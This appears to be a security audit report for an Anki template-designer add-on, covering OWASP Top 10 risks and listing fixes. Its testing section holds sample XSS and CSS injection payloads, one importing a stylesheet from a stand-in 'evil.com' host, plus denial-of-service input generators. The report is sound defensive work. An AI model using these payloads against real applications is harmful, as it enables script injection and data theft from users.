# Security Analysis Report
**Anki Template Designer Add-on**  
**Date:** December 28, 2025  
**Scope:** OWASP Top 10 + Additional Security Risks

---

## Executive Summary

This comprehensive security analysis covers the Anki Template Designer add-on codebase, evaluating it against OWASP Top 10 vulnerabilities and additional security risks. The add-on is a PyQt6-based desktop application that runs within Anki's sandboxed environment.

**Overall Risk Level:** 🟡 **MODERATE**

The application has several security vulnerabilities that should be addressed, particularly around input validation and HTML rendering. However, as a desktop application running in Anki's controlled environment, the attack surface is limited compared to web applications.

---

## OWASP Top 10 Analysis

### 1. Injection (A03:2021)
**Severity:** 🔴 **HIGH**

#### Findings:

**1.1 HTML/Template Injection**
- **Location:** [ui/template_converter.py](ui/template_converter.py#L89-L133)
- **Issue:** User-provided HTML is parsed using regex without proper sanitization
- **Code:**
```python
def html_to_components(html, css=""):
    field_pattern = r'\{\{([^{}]+)\}\}'
    fields = re.findall(field_pattern, html)
    # Direct regex processing without validation
```
- **Risk:** Malicious template HTML could contain script tags or other dangerous content
- **Impact:** XSS, template injection leading to code execution in preview
- **Recommendation:** Implement HTML sanitization using a library like `bleach` or validate against allowlist

**1.2 CSS Injection**
- **Location:** [ui/template_converter.py](ui/template_converter.py#L31-L68)
- **Issue:** CSS is generated from user input without sanitization
- **Code:**
```python
def components_to_css(components):
    for i, component in enumerate(components):
        comp_css = component.to_css(selector)
        css_parts.append(comp_css)  # No sanitization
```
- **Risk:** Malicious CSS could exploit browser vulnerabilities
- **Impact:** CSS injection attacks, data exfiltration via CSS
- **Recommendation:** Validate CSS properties against allowlist, sanitize values

**1.3 No SQL Injection Risk**
- ✅ **SAFE:** Application uses Anki's ORM for database access, no raw SQL queries found

**Mitigation Priority:** 🔴 HIGH

---

### 2. Cross-Site Scripting (XSS) (A03:2021)
**Severity:** 🔴 **HIGH**

#### Findings:

**2.1 Stored XSS via Template HTML**
- **Location:** [ui/preview_widget.py](ui/preview_widget.py#L120)
- **Issue:** User-generated HTML is rendered directly without sanitization
- **Code:**
```python
def refresh_preview(self):
    html = self.desktop_renderer.render(
        self.current_template,
        self.current_note,
        side=side
    )
    self.desktop_preview.setHtml(html)  # Direct rendering
```
- **Risk:** Malicious scripts in templates execute in preview context
- **Impact:** JavaScript execution, potential data theft, UI manipulation
- **Recommendation:** Sanitize HTML before rendering, use Content Security Policy

**2.2 Component Field Name XSS**
- **Location:** [ui/components.py](ui/components.py#L145-L175)
- **Issue:** Component field names rendered without escaping
- **Code:**
```python
def to_html(self):
    return f'<div class="text-field">{{{{{{self.field_name}}}}}}</div>'
```
- **Risk:** Field names with HTML/script tags could be injected
- **Impact:** XSS in generated templates
- **Recommendation:** HTML-escape all field names and user inputs

**2.3 Visual Builder Component Labels**
- **Location:** [ui/visual_builder.py](ui/visual_builder.py#L85-L90)
- **Issue:** Component labels display field names without escaping
- **Risk:** LOW (Qt handles most escaping, but should be explicit)
- **Recommendation:** Use Qt's text escaping methods explicitly

**Mitigation Priority:** 🔴 HIGH

---

### 3. Broken Access Control (A01:2021)
**Severity:** 🟢 **LOW**

#### Findings:

✅ **Generally Safe:**
- Application runs as desktop software with file system permissions
- No authentication/authorization mechanisms (not applicable)
- File access limited to Anki's data directory through Anki API
- No privilege escalation vectors identified

**Concerns:**
- Configuration file [config.json](config.json) has world-readable permissions
- **Recommendation:** Ensure config file has appropriate file permissions (600/644)

**Mitigation Priority:** 🟢 LOW

---

### 4. Cryptographic Failures (A02:2021)
**Severity:** 🟢 **LOW**

#### Findings:

✅ **Generally Safe:**
- No password storage
- No encryption/decryption operations
- No sensitive data transmission
- No hardcoded secrets found

**Concerns:**
- No data-at-rest encryption for templates (relies on Anki's security)
- **Recommendation:** Document that sensitive template data should not be stored

**Mitigation Priority:** 🟢 LOW

---

### 5. Security Misconfiguration (A05:2021)
**Severity:** 🟡 **MEDIUM**

#### Findings:

**5.1 Debug Information Exposure**
- **Location:** Multiple files
- **Issue:** No explicit debug mode controls, stack traces may be exposed
- **Recommendation:** Implement proper error handling, suppress debug info in production

**5.2 Missing Security Headers**
- **Location:** [ui/preview_widget.py](ui/preview_widget.py#L120)
- **Issue:** QWebEngineView doesn't implement Content Security Policy
- **Code:**
```python
self.desktop_preview.setHtml(html)  # No CSP headers
```
- **Recommendation:** Implement CSP using QWebEngineView settings:
```python
settings = self.desktop_preview.settings()
# Add CSP through custom scheme handler
```

**5.3 Overly Permissive Configuration**
- **Location:** [config.json](config.json)
- **Issue:** `auto_refresh: true` could cause performance issues with malicious templates
- **Recommendation:** Add rate limiting, timeout controls

**5.4 No Input Size Limits**
- **Issue:** No maximum length validation for template HTML/CSS
- **Risk:** DoS through extremely large templates
- **Recommendation:** Implement size limits (e.g., 1MB for HTML, 500KB for CSS)

**Mitigation Priority:** 🟡 MEDIUM

---

### 6. Vulnerable and Outdated Components (A06:2021)
**Severity:** 🟡 **MEDIUM**

#### Findings:

**6.1 Dependency Analysis**
- **PyQt6 6.10.1:** ✅ Recent version (Dec 2024)
- **Python 3.13.9:** ✅ Latest stable
- **No requirements.txt for security scanning**

**Concerns:**
- No automated dependency vulnerability scanning
- No lockfile (requirements.txt missing)
- **Recommendation:**
  1. Create requirements.txt with pinned versions
  2. Use `safety` or `pip-audit` for vulnerability scanning
  3. Set up Dependabot/Renovate for automated updates

**6.2 Missing Security Updates Process**
- No documented security update policy
- **Recommendation:** Create SECURITY.md with update procedures

**Mitigation Priority:** 🟡 MEDIUM

---

### 7. Identification and Authentication Failures (A07:2021)
**Severity:** ⚪ **N/A**

#### Findings:

⚪ **Not Applicable:**
- No authentication mechanism (desktop add-on)
- No user accounts or sessions
- Runs with user's OS-level permissions

---

### 8. Software and Data Integrity Failures (A08:2021)
**Severity:** 🟡 **MEDIUM**

#### Findings:

**8.1 No Code Signing**
- Add-on package not digitally signed
- **Risk:** Users could install tampered versions
- **Recommendation:** Implement code signing for releases

**8.2 No Template Validation**
- **Location:** [utils/template_utils.py](utils/template_utils.py#L43-L80)
- **Issue:** Template validation only checks syntax, not semantic security
- **Code:**
```python
def validate_template(template_html):
    errors = []
    # Only checks conditional tags matching
    # No security validation
```
- **Recommendation:** Add security-focused validation:
  - Check for dangerous HTML elements (`<script>`, `<iframe>`, `<object>`)
  - Validate CSS for dangerous properties (`expression`, `behavior`)
  - Detect suspicious patterns

**8.3 Insecure Deserialization Risk**
- ✅ **SAFE:** No pickle/marshal usage found
- Uses JSON for configuration (safer)
- **Good Practice:** Continue avoiding pickle/marshal

**Mitigation Priority:** 🟡 MEDIUM

---

### 9. Security Logging and Monitoring (A09:2021)
**Severity:** 🟡 **MEDIUM**

#### Findings:

**9.1 No Security Event Logging**
- No logging of template modifications
- No audit trail for configuration changes
- **Recommendation:** Implement logging for:
  - Template HTML/CSS modifications
  - Large template uploads
  - Failed validation attempts
  - Configuration changes

**9.2 No Error Logging**
- Basic error handling without logging
- **Recommendation:** Add structured logging:
```python
import logging
logging.basicConfig(
    filename='template_designer_security.log',
    level=logging.WARNING,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
```

**Mitigation Priority:** 🟡 MEDIUM

---

### 10. Server-Side Request Forgery (SSRF) (A10:2021)
**Severity:** 🟢 **LOW**

#### Findings:

✅ **Generally Safe:**
- No HTTP requests made by the application
- No URL fetching functionality
- No external API calls

**Concerns:**
- Template HTML could contain `<img>` tags with external URLs
- **Location:** [ui/components.py](ui/components.py#L145-L175)
- **Risk:** Privacy leak if preview loads external images
- **Recommendation:** Block external resource loading in QWebEngineView:
```python
settings = view.settings()
settings.setAttribute(QWebEngineSettings.LocalContentCanAccessRemoteUrls, False)
```

**Mitigation Priority:** 🟢 LOW

---

## Additional Security Risks

### 11. Regular Expression Denial of Service (ReDoS)
**Severity:** 🟡 **MEDIUM**

#### Findings:

**11.1 Potentially Vulnerable Regex Patterns**
- **Location:** [utils/template_utils.py](utils/template_utils.py#L23-L25)
- **Code:**
```python
pattern = r'\{\{([^{}]+)\}\}'  # OK - bounded
open_pattern = r'\{\{[#^]([^{}]+)\}\}'  # OK - bounded
```
- **Current Status:** ✅ Patterns appear safe (character class bounds)

**11.2 Complex CSS Regex**
- **Location:** [utils/style_utils.py](utils/style_utils.py#L19-L24)
- **Code:**
```python
css = re.sub(r'/\*.*?\*/', '', css, flags=re.DOTALL)  # Potentially slow
```
- **Risk:** Large malicious CSS with many comments could cause slowdown
- **Recommendation:** Add timeout, input size limits

**Mitigation Priority:** 🟡 MEDIUM

---

### 12. Denial of Service (DoS)
**Severity:** 🟡 **MEDIUM**

#### Findings:

**12.1 No Resource Limits**
- **Issue:** No limits on:
  - Template HTML size
  - CSS size
  - Number of components
  - Nesting depth
- **Risk:** Memory exhaustion, UI freeze
- **Recommendation:** Implement limits:
```python
MAX_TEMPLATE_SIZE = 1_000_000  # 1MB
MAX_COMPONENTS = 1000
MAX_NESTING_DEPTH = 10
```

**12.2 Infinite Loop Risk in Template Parsing**
- **Location:** [ui/template_converter.py](ui/template_converter.py#L89-L133)
- **Issue:** While loop in parsing could hang on malformed input
- **Recommendation:** Add iteration limit, timeout

**12.3 Auto-refresh Without Throttling**
- **Location:** [ui/designer_dialog.py](ui/designer_dialog.py#L224-L228)
- **Issue:** Every keystroke triggers preview refresh
- **Code:**
```python
if self.config.get('auto_refresh', True):
    self.update_preview(template)  # No throttling
```
- **Recommendation:** Implement debouncing (300ms delay)

**Mitigation Priority:** 🟡 MEDIUM

---

### 13. Path Traversal
**Severity:** 🟢 **LOW**

#### Findings:

✅ **Generally Safe:**
- No file operations based on user input found
- Uses Anki API for data storage (not raw file paths)
- Test runner uses `subprocess` but with controlled paths

**Concerns:**
- **Location:** [run_tests.py](run_tests.py#L93)
- **Code:**
```python
result = subprocess.run(cmd, cwd=Path(__file__).parent.parent)
```
- **Status:** ✅ Safe - uses fixed paths, not user input

**Mitigation Priority:** 🟢 LOW

---

### 14. Information Disclosure
**Severity:** 🟡 **MEDIUM**

#### Findings:

**14.1 Verbose Error Messages**
- **Location:** Multiple error handlers
- **Issue:** Stack traces may expose internal paths, structure
- **Recommendation:** Catch exceptions, show user-friendly messages:
```python
try:
    # operations
except Exception as e:
    logging.error(f"Template error: {e}")
    showInfo("An error occurred. Please check your template syntax.")
```

**14.2 Configuration Exposure**
- **Location:** [config.json](config.json)
- **Issue:** Config file readable by any user
- **Status:** 🟢 Acceptable for this use case (no secrets)

**Mitigation Priority:** 🟡 MEDIUM

---

### 15. Cross-Site Request Forgery (CSRF)
**Severity:** ⚪ **N/A**

#### Findings:

⚪ **Not Applicable:**
- Desktop application, no web forms
- No HTTP endpoints to protect

---

## Secure Coding Practices Review

### ✅ Good Practices Observed

1. **No Dynamic Code Execution**
   - No `eval()`, `exec()`, `compile()` found
   - ✅ **EXCELLENT**

2. **No Dangerous Deserialization**
   - Uses JSON instead of pickle
   - ✅ **GOOD**

3. **Type Safety**
   - Uses Enums for type safety (`ComponentType`, `Alignment`)
   - ✅ **GOOD**

4. **Separation of Concerns**
   - Clear separation between UI, logic, and data
   - ✅ **GOOD**

5. **No Hardcoded Credentials**
   - No passwords, API keys, or secrets found
   - ✅ **EXCELLENT**

### ❌ Areas for Improvement

1. **Input Validation**
   - Minimal validation on user inputs
   - 🔴 **NEEDS IMPROVEMENT**

2. **Output Encoding**
   - HTML/CSS not properly escaped
   - 🔴 **NEEDS IMPROVEMENT**

3. **Error Handling**
   - Generic exception handling, no logging
   - 🟡 **NEEDS IMPROVEMENT**

4. **Security Testing**
   - No security-focused tests found
   - 🟡 **NEEDS IMPROVEMENT**

5. **Dependency Management**
   - No dependency scanning or lockfile
   - 🟡 **NEEDS IMPROVEMENT**

---

## Threat Modeling

### Attack Vectors

1. **Malicious Template Import**
   - **Scenario:** User imports template with XSS payload
   - **Impact:** Script execution in preview window
   - **Likelihood:** MEDIUM
   - **Severity:** HIGH
   - **Risk Score:** 🔴 HIGH

2. **Template Injection**
   - **Scenario:** Crafted field names contain HTML/JavaScript
   - **Impact:** XSS, UI manipulation
   - **Likelihood:** MEDIUM
   - **Severity:** MEDIUM
   - **Risk Score:** 🟡 MEDIUM

3. **CSS Injection**
   - **Scenario:** Malicious CSS properties exploit browser
   - **Impact:** Data exfiltration, UI spoofing
   - **Likelihood:** LOW
   - **Severity:** MEDIUM
   - **Risk Score:** 🟡 MEDIUM

4. **Resource Exhaustion**
   - **Scenario:** Extremely large template causes freeze
   - **Impact:** DoS, application crash
   - **Likelihood:** LOW
   - **Severity:** LOW
   - **Risk Score:** 🟢 LOW

---

## Priority Remediation Plan

### 🔴 Critical (Immediate - Next 7 Days)

1. **Implement HTML Sanitization**
   - Add HTML sanitizer before rendering in preview
   - Use `bleach` or similar library
   - Files: [ui/preview_widget.py](ui/preview_widget.py), [ui/template_converter.py](ui/template_converter.py)

2. **Add Input Validation**
   - Validate component field names (alphanumeric + underscores only)
   - Escape HTML in all user-facing outputs
   - Files: [ui/components.py](ui/components.py)

3. **Implement Content Security Policy**
   - Add CSP to QWebEngineView
   - Block inline scripts, external resources
   - File: [ui/preview_widget.py](ui/preview_widget.py)

### 🟡 High (Next 2 Weeks)

4. **Add Resource Limits**
   - Maximum template size (1MB)
   - Maximum components (1000)
   - Maximum nesting depth (10)
   - Files: [ui/template_converter.py](ui/template_converter.py), [ui/visual_builder.py](ui/visual_builder.py)

5. **Implement Template Security Validation**
   - Check for dangerous HTML elements
   - Validate CSS properties
   - File: [utils/template_utils.py](utils/template_utils.py)

6. **Add Security Logging**
   - Log template modifications
   - Log validation failures
   - Create audit trail

### 🟢 Medium (Next Month)

7. **Create requirements.txt**
   - Pin all dependency versions
   - Set up automated vulnerability scanning

8. **Add Debouncing to Auto-refresh**
   - Prevent DoS from rapid updates
   - File: [ui/designer_dialog.py](ui/designer_dialog.py)

9. **Create SECURITY.md**
   - Document security policy
   - Vulnerability reporting process
   - Security update procedures

10. **Add Security Tests**
    - XSS injection tests
    - Input validation tests
    - Resource limit tests

---

## Compliance Considerations

### Data Privacy
- ✅ No PII collection
- ✅ No analytics/telemetry
- ✅ Local-only operation
- **Status:** GDPR/CCPA compliant (no applicable requirements)

### Code Distribution
- ⚠️ No code signing
- ⚠️ No integrity verification
- **Recommendation:** Implement signing for AnkiWeb release

---

## Security Testing Recommendations

### Recommended Security Tests

1. **XSS Testing**
   ```python
   # Test cases
   payloads = [
       '<script>alert("XSS")</script>',
       '<img src=x onerror=alert("XSS")>',
       '"><script>alert(String.fromCharCode(88,83,83))</script>',
   ]
   for payload in payloads:
       # Test in field names, template HTML
   ```

2. **CSS Injection Testing**
   ```python
   css_payloads = [
       'expression(alert("CSS"))',
       'url("javascript:alert()")',
       '@import "//evil.com/steal.css"',
   ]
   ```

3. **ReDoS Testing**
   ```python
   # Test with pathological inputs
   large_nested = '{{' * 10000 + 'Field' + '}}' * 10000
   ```

4. **Resource Exhaustion**
   ```python
   # Test with massive templates
   huge_html = '<div>' * 100000 + '{{Field}}' + '</div>' * 100000
   ```

---

## Tools Recommendations

### Security Scanning Tools

1. **Static Analysis**
   - `bandit` - Python security linter
   - `semgrep` - Pattern-based security scanning
   - `pylint` - Code quality + some security checks

2. **Dependency Scanning**
   - `safety` - Check known vulnerabilities
   - `pip-audit` - Audit Python packages
   - Dependabot (GitHub)

3. **Dynamic Analysis**
   - Manual testing with OWASP ZAP proxy
   - Fuzzing with custom payloads

### Setup Commands
```bash
# Install security tools
pip install bandit safety pip-audit

# Run scans
bandit -r ui/ utils/ -f json -o security_report.json
safety check
pip-audit

# Add to CI/CD
# .github/workflows/security.yml
```

---

## Conclusion

### Summary of Findings

| Category | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| OWASP Top 10 | 0 | 2 | 4 | 3 | 9 |
| Additional Risks | 0 | 0 | 5 | 1 | 6 |
| **TOTAL** | **0** | **2** | **9** | **4** | **15** |

### Overall Assessment

The Anki Template Designer has **moderate security risks** primarily related to:
- Input validation and sanitization
- XSS vulnerabilities in template preview
- Missing resource limits and DoS protections

**Strengths:**
- No critical vulnerabilities (auth, SQL injection, remote code execution)
- Good code organization and type safety
- No dangerous deserialization or dynamic code execution
- Limited attack surface (desktop app, no network access)

**Weaknesses:**
- HTML/CSS injection vulnerabilities
- Missing input validation
- No security logging or monitoring
- No security-focused testing

### Recommended Actions

**Immediate (This Week):**
1. Implement HTML sanitization in preview
2. Add input validation for field names
3. Implement basic CSP

**Short Term (This Month):**
4. Add resource limits
5. Create security test suite
6. Set up dependency scanning

**Long Term (Next Quarter):**
7. Implement comprehensive security logging
8. Add code signing
9. Create security documentation
10. Regular security audits

### Risk Acceptance

For a desktop Anki add-on with limited distribution, the current security posture is **acceptable with improvements**. The primary users (Anki users) have technical competence and the sandboxed environment limits exploit impact. However, addressing the HIGH severity XSS vulnerabilities should be prioritized before wider distribution.

---

**Report Version:** 1.0  
**Reviewed By:** Security Analysis Tool  
**Next Review Date:** March 28, 2026  
